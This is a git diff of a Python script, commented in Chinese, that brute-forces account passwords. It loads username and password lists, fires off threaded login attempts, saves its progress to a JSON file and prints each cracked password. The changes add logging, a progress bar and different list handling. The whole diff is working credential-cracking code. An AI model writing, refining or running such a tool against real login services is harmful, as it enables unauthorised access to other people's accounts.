@@ -3,9 +3,18 @@ import requests
 import threading
 import json
 import os
+import logging as log
+import processbar
 
-MAXTHREADNUM = 2  # 线程数量
+MAXTHREADNUM = 1  # 线程数量
 correct_password = None  # 用于线程储存正确pwd
+
+log.basicConfig(
+    level=log.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    filemode="a",
+    filename="log.txt",
+)
 
 
 def test(usrname, password, plm):
@@ -55,12 +64,17 @@ def thread_func(usrname, password):
             if result:
                 correct_password = password
             else:
-                print(f"{(usrname, password)}登录失败")
+                log.debug(f"{(usrname, password)}登录失败")
 
             break
 
         except requests.exceptions.ConnectionError:
-            print(f"{(usrname, password)}连接失败")
+            log.debug(f"{(usrname, password)}连接失败")
+
+        except Exception as e:
+            log.error(f"Unknown expection, current: {(usrname, password)}")
+            log.exception(e)
+            break
 
     MAXTHREADNUM += 1
 
@@ -81,31 +95,38 @@ with open("username.txt", "r") as f:
 username_list = [username.strip() for username in username_list]
 username_list = username_list[current_username:]
 
+# 读取处理密码
+with open("password.txt", "r") as f:
+    password_list = f.readlines()
+password_list = [password.strip() for password in password_list]
+password_list = password_list[current_password:]
+
 for username in username_list:
+
+    bar = processbar.ProgressBar(
+        total=len(password_list), info="正在爆破 " + str(username)
+    )
+
     couter = current_password  # 记录当前密码索引
-    with open("password.txt", "r") as f:
-        f.seek(current_password * 8)  # 设置指针位置
-        while True:
-            password = f.readline().strip()
-            if not password:  # 如果密码文件读取完毕, 则退出循环
-                break
+    for password in password_list:
+        while MAXTHREADNUM <= 0:  # 如果线程数量已满, 则等待
+            pass
 
-            while MAXTHREADNUM <= 0:  # 如果线程数量已满, 则等待
-                pass
+        threading.Thread(target=thread_func, args=(username, password)).start()
+        bar.work(1)
 
-            threading.Thread(target=thread_func, args=(username, password)).start()
+        couter += 1
+        if couter % 64 == 0:  # 当密码索引达到128记录当前密码索引
+            results["current_password"] = couter
+            json.dump(results, open("result.json", "w"))
 
-            couter += 1
-            if couter % 128 == 0:  # 当密码索引达到128记录当前密码索引
-                results["current_password"] = couter
-                json.dump(results, open("result.json", "w"))
-
-            if correct_password:  # 如果正确pwd已经存在, 则退出循环
-                break
+        if correct_password:  # 如果正确pwd已经存在, 则退出循环
+            break
 
     # 处理, 重置参数
     time.sleep(5)
     print(f"\n{username} 的密码为 {correct_password}")
+
     results[username] = correct_password
     results["current_username"] += 1
     results["current_password"] = 0
